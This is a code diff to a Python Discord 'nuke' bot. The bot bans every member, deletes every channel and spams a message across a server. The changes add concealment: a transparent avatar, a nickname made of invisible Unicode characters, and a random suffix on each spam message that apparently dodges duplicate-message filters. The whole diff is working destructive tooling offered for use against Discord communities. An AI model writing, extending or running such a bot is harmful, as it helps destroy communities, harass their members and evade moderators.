@@ -1,12 +1,13 @@
-import traceback, datetime, discord, asyncio
+import traceback, datetime, discord, asyncio, random, string
+from discord.ext import commands
 
 logs = {}
 stops = []
 
 intents = discord.Intents.all()
-class DiscordBot(discord.Client):
+class DiscordBot(commands.Bot):
     def __init__(self, logId:str, token:str, guildId:int, channelName:str, latency:int, message:str, allUserBan:bool, allChannelDelete:bool):
-        super().__init__(intents=intents)
+        super().__init__(intents=intents, command_prefix="!", description="Yaa so good bot\n<<sound:1>>")
         self.logId = logId
         self.token = token
         self.guildId = guildId
@@ -89,11 +90,16 @@ class DiscordBot(discord.Client):
             logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
             await self.close()
             return
+        with open('../assets/transparentAvatar.png', 'rb') as avatar:
+            await self.user.edit(avatar=avatar.read())
+        i = self.guild.get_member(self.user.id)
+        await i.edit(nick="឵᠎")
         if self.allUserBan:
             await self.banAllUser(self.guild)
         if self.allChannelDelete:
             await self.deleteAllChannel(self.guild)
-        await self.nuke(self.nukeLatency, self.message, self.guild, self.channelName)
+        message = self.message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(12))
+        await self.nuke(self.nukeLatency, message, self.guild, self.channelName)
     async def on_message(self, message):
         if message.author.bot:
             return
